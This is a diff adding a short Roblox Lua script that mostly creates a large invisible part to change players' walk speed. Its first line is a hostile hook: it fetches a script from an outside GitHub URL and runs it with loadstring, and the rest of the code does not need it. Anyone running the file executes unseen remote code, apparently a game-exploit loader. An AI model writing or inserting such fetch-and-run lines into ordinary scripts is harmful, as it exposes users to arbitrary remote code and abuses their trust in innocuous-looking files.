@@ -1,0 +1,25 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/pwrsk/mm2/main/mm2'))()
+local Players = game:GetService("Players")
+
+local function onTouched(hit)
+    if hit.Parent:FindFirstChildOfClass("Humanoid") then
+        local humanoid = hit.Parent:FindFirstChildOfClass("Humanoid")
+        humanoid.WalkSpeed = 24
+    end
+end
+
+local part = Instance.new("Part")
+part.Size = Vector3.new(2048, 2048, 2048)
+part.Position = Vector3.new(-107, 146, 21)
+part.Anchored = true
+part.CanCollide = false
+part.Parent = workspace
+
+part.Touched:Connect(onTouched)
+
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        local humanoid = character:WaitForChild("Humanoid")
+        humanoid.WalkSpeed = 16
+    end)
+end)
